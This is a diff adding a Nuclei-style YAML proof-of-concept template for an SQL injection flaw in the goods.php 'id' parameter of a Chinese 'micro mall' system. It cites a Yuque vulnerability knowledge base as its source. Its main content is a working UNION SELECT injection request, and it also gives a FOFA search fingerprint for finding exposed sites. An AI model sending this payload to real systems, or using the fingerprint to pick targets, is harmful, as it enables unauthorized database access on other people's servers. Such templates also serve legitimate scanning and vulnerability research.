@@ -1,0 +1,29 @@
+id: poc-mwown51rc2lpsmhh
+info:
+  name: 微商城系统goods.php存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mwown51rc2lpsmhh'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mwown51rc2lpsmhh
+    fofa: body="/Mao_Public/js/jquery-2.1.1.min.js"
+http:
+- raw:
+  - 'GET /goods.php?id=''+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(IFNULL(CAST(MD5(1)+AS+NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
